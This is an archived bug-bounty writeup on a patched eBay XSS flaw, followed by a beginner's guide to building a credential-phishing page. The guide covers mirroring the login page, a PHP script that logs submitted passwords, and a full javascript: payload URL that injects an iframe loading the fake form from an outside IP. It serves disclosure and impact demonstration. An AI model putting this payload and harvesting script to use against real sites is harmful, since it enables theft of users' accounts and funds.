---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-07-24_ebay-xss-demo-and-guide-to-spear-phishing.md
original_filename: 2021-07-24_ebay-xss-demo-and-guide-to-spear-phishing.md
title: eBay XSS demo and guide to spear phishing
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: 177de4b645654356aca85dff2af248c1fe1e84185c5b6527a7353ac3befba8b0
text_sha256: f7e426df31774b7364c55329d368598b79ee7feef93d14f94376bea7aeef105f
ingested_at: '2026-06-28T07:32:07Z'
sensitivity: unknown
redactions_applied: false
---

# eBay XSS demo and guide to spear phishing

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-07-24_ebay-xss-demo-and-guide-to-spear-phishing.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:32:07Z
- Redactions Applied: False
- Raw SHA256: `177de4b645654356aca85dff2af248c1fe1e84185c5b6527a7353ac3befba8b0`
- Text SHA256: `f7e426df31774b7364c55329d368598b79ee7feef93d14f94376bea7aeef105f`


## Content

---
title: "eBay XSS demo and guide to spear phishing"
page_title: "eBay XSS demo and guide to spear phishing - 'This is our world now... the world of the electron and the switch, the beauty of the baud'"
url: "https://0x80dotblog.wordpress.com/2021/07/24/ebay-xss-demo-and-guide-to-spear-phishing/"
final_url: "https://bughalt.org/2021/07/24/ebay-xss-demo-and-guide-to-spear-phishing/"
authors: ["MLT (@0dayWizard)"]
programs: ["Ebay"]
bugs: ["XSS"]
publication_date: "2021-07-24"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3483
---

Hello, world. This blog post will highlight exactly how easy it is to exploit XSS vulnerabilities in large sites, and will also highlight how little these companies actually care (until they run the risk of being publicly exposed). I’ll be keeping this post fairly short, just showing a quick demonstration of how easy it is… 

Hello, world. This blog post will highlight exactly how easy it is to exploit XSS vulnerabilities in large sites, and will also highlight how little these companies actually care (until they run the risk of being publicly exposed). I’ll be keeping this post fairly short, just showing a quick demonstration of how easy it is to exploit things like this. As of writing this blog post, the vulnerability is now patched – but it should be pointed out that I waited a month with no response from eBay, and they only rushed to patch the vulnerability after the media contacted them about it.

By reading this blog, you should gain an understanding of how simple it is to set up a login credential harvesting PoC via a spear-phishing attack, which should allow you to increase your impact for XSS vulnerabilities and hopefully get higher payouts as a result. Triage teams will appreciate stuff like this a lot more than merely popping an alert(1) – especially if they ask you to demonstrate impact. 

Note, that this demo regarding setting up the spear phishing payload is specific to eBay – that being said, you can apply these same techniques to pretty much any site that is vulnerable to XSS, with only a few minor tweaks.

Take the following URL:

> [http://ebay.com/link/?nav=webview&url=javascript:alert(document.cookie)](http://ebay.com/link/?nav=webview&url=javascript:alert\(document.cookie\))

**Screenshot of live URL:**

![ebay](https://ret2libc.files.wordpress.com/2016/01/ebay.png?w=960)

This is a fairly basic vulnerability on a site where XSS would generally be considered a huge issue (even moreso since the main domain is involved). It should be noted that while the following URL is crafted to display the document.cookie output, cookies cannot be stolen due to the HttpOnly flag being set.

In the cases of some sites, spear phishing is considered useless (for example if the site does not have a large userbase that requires logins), although in the case of this site, spear phishing has many valid uses – it could be used to steal funds from people, use trusted eBay accounts to scam other users, and more.

First I am going to explain the steps required to setup an authentic looking phishing page, then I am going to apply these steps to eBay to show how easily this can be achieved. Obviously the first step would be to obtain a copy of the website’s source for the login page. You could do this by saving the source code after viewing it manually, but this is time consuming and inefficient, as for the page to look identical you would need to individually download every single image that’s on the page and ensure that they are saved in the correct directories, as well as creating a bunch of relevant directories or altering the paths to images and other pages in the source code. Alternatively you can use some website mirroring software to automate this process, which is what I suggest doing.

The software I suggest using is WebHTTrack, because it is efficient, easy to use, and cross platform. To install it on windows, just download the executable and run it. To install on linux (debian based) use the following commands:

> apt-get update 
> 
> apt-get install webhttrack 

To install on other distros (such as CentOS/RHEL) just wget/cURL the tarball and unpack it then configure, the following commands can be used:

> yum install zlib-devel
> 
> wget <http://download.httrack.com/cserv.php3?File=httrack.tar.gz> -O httrack.tar.gz
> 
> tar xvfz httrack.tar.gz 
> 
> ./configure 
> 
> make && make install 

The screenshots below will detail the process required to mirror the site via WebHTTrack (for this demonstration I will be using the web-based client for linux):

![httrack1](https://ret2libc.files.wordpress.com/2016/01/httrack1.png?w=960)

**This page should launch locally in your browser after running the app**

![httrack2](https://ret2libc.files.wordpress.com/2016/01/httrack2.png?w=960)

**The next step is to choose your project name and set the path to where you want the files to be mirrored**

![httrack3](https://ret2libc.files.wordpress.com/2016/01/httrack3.png?w=960)

**After this, its just a case of inputting the URL to the page you want to mirror. There are also some other additional options you can select, but the default options will work fine.**

After this, the mirroring process will begin. If all goes well, you should have all of the files for the page you specified, downloaded to the directory that you specified:

![ebayy](https://ret2libc.files.wordpress.com/2016/01/ebayy.png?w=922&h=231&fit=922%2C231)

After this, you need to change the form inputs for the page (for the login form) to send data to your PHP script (more on this soon), rather than a login script that is part of eBay:

![DSDSDS](https://ret2libc.files.wordpress.com/2016/01/dsdsds.png?w=867&h=431&fit=867%2C431)

Use a text editor to search for the form tag within the HTML source for the login page, and change the action= attribute to point to the name of your PHP script. After this you’ll want to upload the relevant files to your site (presumably in the **/var/www/html** directory). To do this I suggest using an FTP/SFTP client such as FileZilla.

Once you’ve got the files uploaded to the relevant directory, its time to make the PHP script (obviously you’ll need PHP installed alongside your HTTP daemon for this), here is the script I used:

> **`root@MLT:/var/www/html/ebay/signin.ebay.com/ws# cat log.php  
>  <?php`**
> 
> **`file_put_contents(“log.txt”, $_GET[‘1383430133’].”:”.$_GET[‘1794992350’].PHP_EOL,FILE_APPEND);`**
> 
> **`die(header(‘Location:[http://ebay.com/&#8217](http://ebay.com/&#8217);));  
> ?>`**

**If you’re modifying this for another site, you’ll need to change the GET inputs to match those relevant to the site in question.**

Next, you’ll have to ensure that the permissions are correctly setup so that you can write to your logfile (**log.txt**), the following command can be used:

> chmod +x log.txt

After this, you can test it locally on your site by loading the login form and entering a username and password, then checking log.txt to see if it writes to it as expected.

The next step is to include the link to your phishing page within the context of the vulnerable site. In the example of ebay, the XSS vulnerability was not tag-based but was rather pure javascript, so rather than including an iframe directly as input to the ?url= get param, the javascript **document.write** function needed to be used to write the HTML contents to the page and embed the iframe.

In the case of eBay, the iframe containing my phishing page was injected to the page using the following payload:

> _document.write(‘ <iframe src=”_[http://45.55.162.179/ebay/signin.ebay.com/ws/eBayISAPI9f90.html&#8221](http://45.55.162.179/ebay/signin.ebay.com/ws/eBayISAPI9f90.html&#8221) _; width=”1500″ height=”1000″ >’)_

This is a badly-crafted URL and would not work well in a realistic phishing secnario. In a realistic scenario, the URL would be obfuscated, and rather than injecting all of the code through document.write, it would make more sense to use fetch(); to grab a remote .js file, and then have that file load the HTML to inject the fake login form. For the purposes of this demonstration though, this will work fine. 

Here is the final URL:

> [http://ebay.com/link/?nav=webview&url=javascript:document.write%28%27%3Ciframe%20src=%22http://45.55.162.179/ebay/signin.ebay.com/ws/eBayISAPI9f90.html%22%20width=%221500%22%20height=%221000%22%3E%27%29](http://ebay.com/link/?nav=webview&url=javascript:document.write%28%27%3Ciframe%20src=%22http://45.55.162.179/ebay/signin.ebay.com/ws/eBayISAPI9f90.html%22%20width=%221500%22%20height=%221000%22%3E%27%29)

Below is a screenshot of the injected login form:

![ebayyyy](https://ret2libc.files.wordpress.com/2016/01/ebayyyy.png?w=960)

After the user credentials are entered on the phishing page that appears to be part of ebay.com, a GET request is made to **log.php** on my server and the inputs are written to **log.txt** available for me to read in plaintext.

Here is a video proof-of-concept, demonstrating the ability to log passwords via the fake form:

This post was intended for beginners to give them an understanding of what steps are required to setup a phishing page to be used for spear phishing. I will update this post later with my correspondance with ebay, to give anyone who’s reading this an idea of how you should **not** handle security incidents relating to your site.

Hope you enjoyed. That’s all for now.

### Share this:

  * [ Share on X (Opens in new window) X ](https://bughalt.org/2021/07/24/ebay-xss-demo-and-guide-to-spear-phishing/?share=twitter)
  * More
  * 

  * [ Share on Facebook (Opens in new window) Facebook ](https://bughalt.org/2021/07/24/ebay-xss-demo-and-guide-to-spear-phishing/?share=facebook)
  * [ Print (Opens in new window) Print ](https://bughalt.org/2021/07/24/ebay-xss-demo-and-guide-to-spear-phishing/#print?share=print)
  * [ Share on LinkedIn (Opens in new window) LinkedIn ](https://bughalt.org/2021/07/24/ebay-xss-demo-and-guide-to-spear-phishing/?share=linkedin)
  * [ Share on Reddit (Opens in new window) Reddit ](https://bughalt.org/2021/07/24/ebay-xss-demo-and-guide-to-spear-phishing/?share=reddit)
  * [ Share on Telegram (Opens in new window) Telegram ](https://bughalt.org/2021/07/24/ebay-xss-demo-and-guide-to-spear-phishing/?share=telegram)
  * [ Share on WhatsApp (Opens in new window) WhatsApp ](https://bughalt.org/2021/07/24/ebay-xss-demo-and-guide-to-spear-phishing/?share=jetpack-whatsapp)
  * [ Email a link to a friend (Opens in new window) Email ](mailto:?subject=%5BShared%20Post%5D%20eBay%20XSS%20demo%20and%20guide%20to%20spear%20phishing&body=https%3A%2F%2Fbughalt.org%2F2021%2F07%2F24%2Febay-xss-demo-and-guide-to-spear-phishing%2F&share=email)
  * 

### Like this:

Like Loading…
